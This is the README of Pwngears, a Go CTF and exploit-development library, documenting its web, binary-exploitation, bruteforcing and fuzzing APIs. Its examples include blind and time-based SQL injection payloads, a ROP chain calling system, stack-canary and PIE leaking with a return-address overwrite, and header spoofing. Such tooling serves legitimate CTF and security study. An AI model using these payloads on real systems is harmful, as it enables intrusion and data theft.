Pwngears is a CTF framework and exploit development library based on pwntools. It aims to provide an improved API and better error handling while adding more functionnalities regarding challenges other than binary exploitation. It also aims to provide its core package without any external dependencies, leveraging the Go standard library. 

## Why Go? And why make an alternative to Pwntools?
- Compiles into a static binary, eliminating risk of an exploit not working on somebody else version of the python interpreter. Also has easy cross compilation.
- Good performance and cheap goroutines allows for easy and quick byte-by-bytes leaks, length leaks and blind SQLI.
- The Go standard library provides all the tooling to make this library possible. This eliminates the dependency on other libraries the same way pwntools requires.
- Strong static typing helps prevents inattention errors during the writing of your exploit.
- Compare to other great compiled language, Go also provide good developer velocity with a clear and concise syntax.

## Exclusive features that are not included in Pwntools
- Proper web support. The web package will allow you to built your exploit to be sent over the web easily, while also providing more advanced function to prevent a lot of boilerplate code.
- Cryptography support. The crypto package will make it simple to encrypt, decrypt but also brute-force some encryption and cyphers. This package makes use of goroutines to allow the usage of all your CPU cores for better decryption performance.
- Wordlist and premade payloads. A lot of common payloads are embbeded to make it easy to build injections and other payloads.
- CLI tools to run some useful commands without building a go project. Allows encryption and decryption directly from the command line as well as other useful commands for CTF challenges.

## Upcoming features
- [x] Possibility to opt in and out of error returns and instead use a logger
- [x] Cryptography support
- [ ] ELF support
- [x] Exploit skeleton builder for quick setup with necessary packages
- [ ] GPU accelerated brute forcing
- [ ] Image layer analysis

## Quick Showcase
Everything below comes from the single root import: `import . "github.com/tonythetender/pwngears"`.
```go
// ---------- Binary exploitation ----------
r := Remote("127.0.0.1", 1337)
defer r.Close()

r.SendLineAfter("Name: ", "Arthur")
leak := U64(r.Recv(8))
Info(fmt.Sprintf("leak: %#x", leak))

r.SendPayload(Pay().
	PadTo(40).
	P64(leak - 0x2a).
	P64(0x401234))

key := r.RecvLineString()

// ---------- Web ----------
conn := Conn("http://some-ctf-website.com")

resp := conn.Get("/search",
	WithParam("query", "admin"),
	WithCookie("admin-key", key))

pass := resp.Match(`pass: (.*)`)

login := conn.PostForm("/login", Fields{
	"username": "admin",
	"password": pass,
})
cipher := login.Match(`secret-encrypted-flag:(.*)`)

// ---------- Cryptography ----------
engine := NewCryptoEngine()

results := engine.BruteForce(XORCipher{}, []byte(cipher),
	WithMaxKeyLength(8),
	WithFindAllPossibleKeys(false),
	WithPatternPrefix("PWNGEARS{"),
	WithPatternSuffix("}"),
)
for _, res := range results {
	fmt.Printf("[%s] key=%q\n%s\n", res.Cipher, res.Key, res.Plaintext)
}
```

## Installation
```sh
go get github.com/tonythetender/pwngears
```
Everything you need for the common case is re-exported from a single root package, so most exploits only need one import.
```go
import . "github.com/tonythetender/pwngears"
```
This gives you the whole dependency-free core (binary exploitation, web, cryptography and bruteforcing) under one namespace. The root package pulls in no third-party code, so an exploit built on it compiles to a lean static binary.

If you prefer a more focused namespace, you can still import the individual subpackages directly.
```go
import (
	"github.com/tonythetender/pwngears/web"
	"github.com/tonythetender/pwngears/bruteforce"
)
```

Features that rely on an external dependency live in their own opt-in subpackages, so they are only pulled into your binary when you actually import them. The HTML navigation package (`web/dom`) is one such example and is covered in its own section below.
```go
import "github.com/tonythetender/pwngears/web/dom"
```
## Basic Syntax

> [!NOTE]
> For the purpose of writing more compact code and because exploit dont normally involve a ton of other imports, we'll be using the `.` notation on imports. If you want to import other libraries or write your own functions that conflict with pwngears exported function, feel free to use more explicit import. 

### Errors returns or logging
This framework provides 2 different ways to open a connection. The methods attached to the connection will act the same but their return values will vary depending on the connection chosen. Because exploits shouldn't be more verbose than they need to be, the user can opt to not have errors returned from any methods. Instead a logger is used. This is the default connection.

```go
conn := Conn("http://some-ctf-website.com")
resp := conn.Get("/")
```

While the default log level is `INFO`, the user can also set a custom logger by passing a logger to the connection constructor. The user can customized their own slog logger or use the default logger constructor with the chosen log level.
```go
logger, _ := NewDefaultLogger("DEBUG")
conn := ConnWithLogger("http://some-ctf-website.com", logger)
resp := conn.Get("/")
```

or
```go
conn := Conn("http://some-ctf-website.com")
conn.SetLogLevel("ERROR")
resp := conn.Get("/")
```
By default, the program will stop when an error is encountered. You can modify this behavior with the following function.
```go
conn.SetFailOnError(false)
```

The second way is with the more idiomatic, but verbose Go errors return. When opening the connection with the following function, all the methods will return an error value, except when it doesnt apply. You can then decide how to handle the error.
```go
conn, err := ConnWithErrors("http://some-ctf-website.com")
if err != nil {
	log.Fatalf("Connection couldn't be established: %v", err)
}
resp, err := conn.Get("/")
if err != nil {
	log.Fatalf("Error during GET request: %v", err)
}
```
> [!NOTE]
> The example given above are with the web connection, but they all work the same way with process and remote connections, as well as other constructors like the bruteforcer. Just replace `Conn` with `Process` or `Remote`. From here on out, to keep the documentation concise, the connection with the logger will be used.
        
### Web
With the root import, the web helpers are already in scope.
```go
import . "github.com/tonythetender/pwngears"
```

The connection keeps track of things like cookies and headers while making sure it doesn't time out or follow redirects indefinitely.

From there you can make GET request simply like this :
```go
resp := conn.Get("/")

fmt.Println(resp.Text())
```

You can also add query directly in the string or by adding parameters
```go
resp := conn.Get("/search",
	WithParam("category", "shoes"),
	WithParam("color", "blue"),
	WithParam("size", "9"))

```
You can add headers or cookies the same way, one at a time or in bulk.
```go
resp := conn.Get("/search",
	WithHeader("Content-Type", "application/json"),
	WithCookie("session", "abc123"))

resp := conn.Get("/admin",
	WithHeaders(map[string]string{"X-Forwarded-For": "127.0.0.1"}),
	WithCookies(map[string]string{"role": "admin"}))
```
Authentication options are also available.
```go
resp := conn.Get("/api", WithBearer(token))
resp := conn.Get("/api", WithBasicAuth("admin", "admin"))
```

To send a POST request, `PostForm` is the quickest way. You can pass the fields as key/value pairs, as a `Fields` map, or mix in request options.
```go
resp := conn.PostForm("/login", "username", "admin", "password", "hunter2")

resp := conn.PostForm("/login", Fields{
	"username": "admin",
	"password": "hunter2",
})

resp := conn.PostForm("/login", Fields{"username": "admin"},
	WithHeader("X-CSRF-Token", token))
```
If you need multi-value fields or already have a `url.Values`, `Post` takes one directly.
```go
form := NewForm()
form.Add("tag", "a")
form.Add("tag", "b")
resp := conn.Post("/filter", form)
```
The other HTTP verbs are available too. `Put` and `Patch` take a form body like `Post`, while `Delete`, `Head` and `Options` take only options.
```go
conn.Put("/item/1", Fields{"name": "updated"})
conn.Delete("/item/1")
conn.Head("/large-file")
```

### JSON
When a challenge expects a JSON body instead of a form, use `PostJSON`. It accepts a struct, a map, or raw `string`/`[]byte`, and sets the `application/json` content type for you.
```go
resp := conn.PostJSON("/api/login", map[string]any{
	"username": "admin",
	"id":       1,
})
```
For a hand-crafted body that is neither a form nor JSON, `PostRaw` sends a `string` or `[]byte` as-is and leaves the content type to you.
```go
resp := conn.PostRaw("/api", `{"id":1}`, WithContentType("application/json"))
resp := conn.PostRaw("/upload", rawBytes, WithContentType("application/octet-stream"))
```
You can also keep the body or the form fields in a file and load them at runtime. `LoadFields` reads a JSON object into form fields (sent url-encoded, like a normal form), while `LoadJSON` reads a file to send as a raw JSON body.
```go
resp := conn.PostForm("/login", LoadFields("login.json"))
resp := conn.PostJSON("/api", LoadJSON("payload.json"))
```
To read a JSON response back, pass a pointer to `JSON`.
```go
var out struct {
	Token string `json:"token"`
}
resp.JSON(&out)
fmt.Println(out.Token)
```

### One-off requests
For a quick probe you don't need to build a connection first. The package-level `Get`, `Post`, `PostForm`, `PostJSON` and `PostRaw` take a full URL, fire a single request and return the response.
```go
resp := Get("http://some-ctf-website.com/robots.txt")
resp := PostForm("http://some-ctf-website.com/login", Fields{"user": "admin"})
resp := PostJSON("http://some-ctf-website.com/api", map[string]any{"id": 2})
```
Each call opens its own throwaway connection, so cookies are not kept between them. For a multi-step flow (such as logging in and then scraping) use a `Conn` instead.

### Reading responses
The response gives you a few helpers to avoid writing regexes by hand. `Match` returns the first capture group (or the whole match if there is no group), while `MatchAll` returns every match.
```go
resp := conn.Get("/profile")

pass := resp.Match(`password: (\w+)`)
tokens := resp.MatchAll(`token=(\w+)`)
flag := resp.Flag("FLAG")
```
> [!NOTE]
> With the default (logger) connection, `Match` and `Flag` stop the program if nothing matches, since you usually expect the value to be there. Use `SetFailOnError(false)` to instead get an empty result, or use the error-returning connection. `MatchAll` never fails on zero matches.

You can also inspect the status, headers and cookies directly.
```go
if resp.OK() {            // status in the 2xx range
	// ...
}
resp.Is(302)              // status code equals
resp.Location()           // Location header
resp.Cookie("session")    // value of a response cookie by name
resp.Text()               // body as a string
resp.Lines()              // body split into lines
resp.Contains("admin")    // substring check on the body
```

### DOM parsing and navigation
The helpers above search the raw body. When you need to actually parse the HTML, select elements, follow links or round-trip a form, use the opt-in `web/dom` package. It is built on `golang.org/x/net/html`, so it lives in its own subpackage and is only compiled into your binary when you import it.
```go
import (
	. "github.com/tonythetender/pwngears"
	"github.com/tonythetender/pwngears/web/dom"
)
```
`dom.Fetch` requests a path through your connection and parses the result into a `Page`. From there you can select elements with a small CSS-like selector (tag, `.class`, `#id`, `[attr]`, `[attr=value]`, and descendant combinators) and read their attributes or text.
```go
conn := Conn("http://some-ctf-website.com")
page := dom.Fetch(conn, "/")

title := page.First("h1").Text()
for _, a := range page.All("a[href]") {
	fmt.Println(a.Attr("href"), "->", a.Text())
}
```
Following a link reuses the same connection, so cookies and the session are kept. Relative links are resolved against the current page.
```go
next := page.First("a.next").Follow()   // or page.Follow("a.next")
flag := next.Flag("FLAG")
```
`Form` is the most useful part for CTF. It pre-loads every field already in the form, including hidden inputs and CSRF tokens, so you only set what you want and submit. It posts to the form's resolved action with its method.
```go
after := page.Form("#login").
	Set("username", "admin").
	Set("password", "admin").
	Submit()

if after.Contains("Welcome") {
	// logged in, with the CSRF token carried over automatically
}
```
The page also exposes convenience extractors.
```go
page.Links()              // all hrefs, resolved to absolute URLs
page.Attrs("img", "src")  // one attribute across every match
page.Texts(".comment")    // inner text of every match
page.Flag("FLAG")         // grep the page for a flag
```

### Binary exploitation
The binary exploitation helpers come with the root import as well.
```go
import . "github.com/tonythetender/pwngears"
```
To do binary exploitation (ie pwning and reverse) you can connect to a process either localy through an executable
```go
conn := Process("./command")
defer conn.Close()
```
You can pass command-line arguments directly. To set environment variables (for example to load a specific libc with `LD_PRELOAD`), use `ProcessWith`.
```go
p := Process("./command", "arg1", "arg2")

p := ProcessWith("./command",
	WithArgs("arg1"),
	WithEnv(map[string]string{"LD_PRELOAD": "./libc.so.6"}),
)
```
Or through a tcp connection
```go
r := Remote("127.0.0.1", 12069)
```
With the possibility of SSL/TLS over TCP. Self-signed certificates are accepted by default, since CTF servers typically use them.
```go
r := Remote("127.0.0.1", 12069, SSL())
```
You can set a specific SNI or enforce proper certificate verification.
```go
r := Remote("127.0.0.1", 12069, SSL(), WithSNI("chal.ctf"))
r := Remote("127.0.0.1", 12069, SSL(), WithVerifyCert(true))
```
You can then send inputs directly to the process. The library takes care of converting the string to bytes, but you can also explicitly send bytes to it. Those wont be converted again.
```go
r.SendLine("shellcode")
r.SendLine([]byte("shellcode"))
```
You can also send an input after the process as output a certain line
```go
r.SendLineAfter("Name: ", "John")
```

#### Building payloads
Payloads are built fluently. `Pay()` (or `Flat()`) takes any mix of parts in a single call: a `string` or `[]byte` is appended raw, and an integer is packed little-endian. Bare integers are packed as 64-bit, since addresses are the common case; use a `uint32`/`uint16`/`byte` value (or `P32`/`P16`/`P8`) when you need a narrower width.
```go
// padding is []byte, the rest are uint64 addresses
Flat(padding, popRdi, binsh, ret, system)
```
You can also chain builders, which reads well for the classic "padding then addresses" layout. `PadTo` fills with `A` up to a length, `.Flat(...)` splices in a run of parts, and `Ret` is an alias for `P64` that documents intent.
```go
payload := Pay().
	PadTo(72).
	Flat(popRdi, binsh, ret).
	Ret(system)

r.SendPayload(payload)
```
> [!NOTE]
> `Pay(...)`, `Flat(...)` and `.Flat(...)` pack a bare integer as 8 bytes. The older `.Add(...)` method still packs an `int` as 4 bytes, so prefer `Flat`/`P64`/`Ret` for 64-bit addresses to avoid silently truncating them.

## Advanced Syntax

### Bruteforcing and oracles
A lot of challenges make you recover a value one character at a time: blind SQL injection, a comparison endpoint, a reset token check. The `Bruteforcer` drives the loop; an *oracle* tells it whether a guess is correct.

`Oracle` turns "send a payload, then look at the response" into the yes/no test the bruteforcer expects. You decide how the payload is sent (query parameter, path, header, body) and what counts as success.
```go
conn := Conn("http://some-ctf-website.com")

oracle := Oracle(
	func(guess string) *Response {
		q := fmt.Sprintf("1 AND SUBSTRING(password,1,%d)='%s'", len(guess), guess)
		return conn.Get("/item", WithParam("id", q))
	},
	func(r *Response) bool { return r.Contains("found") },
)

bf := NewBruteforcer()
bf.Charset = GenerateCharset("lowercase", "digits")
bf.Workers = 16 // test the charset concurrently; leave at 1 for a sequential scan
bf.Delay = 50 * time.Millisecond

password, _ := bf.BruteforceCharByChar("", "", oracle)
```
`Workers` races the whole charset for each position and stops as soon as a character matches, which is a big speedup against a slow endpoint. Set it back to `1` when the target is rate limited or order sensitive.

### Binary search extraction
When the oracle can answer "is the byte at this position greater than N", you can binary-search each character instead of scanning the whole charset. That is about 7 requests per character rather than one per candidate.

`GreaterOracle` builds the comparison test, and `BinarySearch` drives it (positions are 1-indexed, and extraction stops when it reaches the end of the string).
```go
greater := GreaterOracle(
	func(pos, value int) *Response {
		q := fmt.Sprintf("1 AND ASCII(SUBSTRING(password,%d,1))>%d", pos, value)
		return conn.Get("/item", WithParam("id", q))
	},
	func(r *Response) bool { return r.Contains("found") },
)

bf := NewBruteforcer()
bf.MaxLength = 32
password, _ := bf.BinarySearch(greater)
```

### Fuzzing
For discovery (directories, parameters, subdomains) `Fuzz` runs a wordlist concurrently and keeps the responses that pass your filters. You provide a function that sends the request for a word, so the injection point is wherever you put it.
```go
hits := Fuzz(
	func(word string) *Response { return conn.Get("/" + word) },
	wordlist,
	MatchStatus(200, 301),
	FilterLength(1234),
)
for _, h := range hits {
	fmt.Printf("%-20s status=%d len=%d\n", h.Word, h.Status, h.Length)
}
```
Filters are combined with AND. `MatchStatus`, `MatchLength` and `MatchRegex` keep a response; `FilterStatus`, `FilterLength` and `FilterRegex` discard one (handy for hiding a known "not found" page). Fuzzing runs 20 workers by default; use `Fuzzer{Workers: n}.Run(...)` to change that. Hits come back in wordlist order.

### Time-based SQLI
Sometimes the response is identical whether the guess is right or wrong, and the only signal is how long the query takes. `TimingAttack` measures each attempt and keeps a character when the request runs longer than your threshold. It stays sequential on purpose, since running attempts in parallel would add noise to the timing.
```go
bf := NewBruteforcer()
bf.Charset = GenerateCharset("lowercase", "digits")

password, _ := bf.TimingAttack("", func(guess string) time.Duration {
	payload := fmt.Sprintf(
		"1 UNION SELECT IF(SUBSTRING(password,1,%d)='%s',SLEEP(3),0) FROM users",
		len(guess), guess)
	start := time.Now()
	conn.Get("/item", WithParam("id", payload))
	return time.Since(start)
}, 3*time.Second)
```

### Binary Exploitation
Some helpers automate leaking a stack canary or an address by brute-forcing one byte at a time. These helpers operate on the raw `Tube`, so open the connection with `NewRemote` (which returns a tube) rather than the logger wrapper, and give the exploit a function that reconnects and gets you back to the leak point.

Each guess needs a check that tells the brute-forcer whether the byte was right. Rather than writing that closure by hand every time, the ready-made checks cover the common cases: `RecvLineContains` / `RecvContains` look for a marker in the response, while `Survives` / `Crashed` key off whether the connection stayed alive after the payload.
```go
r, _ := NewRemote("127.0.0.1", 12069)
defer r.Close()

exploit := NewExploit(r)
exploit.SetConnectFunc(func() Tube {
	c, _ := NewRemote("127.0.0.1", 12069)
	c.SendLine("Arthur")
	return c
})

// The byte is correct when the "Saved" line is displayed.
canary, _ := exploit.LeakCanary(40, RecvLineContains("Saved"))
retAddr, _ := exploit.LeakAddress(40, canary, 8, RecvLineContains("Saved"))

pieBase := retAddr - 0x1811
winAddr := pieBase + 0x12e9

Pay().
	PadTo(40).
	Canary(canary).
	Repeat("B", 8).
	Ret(winAddr).
	SendWithSize(r)
```
Because every guess reconnects through `SetConnectFunc`, the leaks are brute-forced concurrently by default (8 workers), which turns a slow byte-at-a-time canary leak into a quick one. Tune it with `exploit.SetWorkers(n)`, or set it to `1` to go sequential against a rate-limited target. When the exploit runs against a local `Process` with no reconnect function, there is nothing fresh to reconnect to, so it automatically stays sequential.
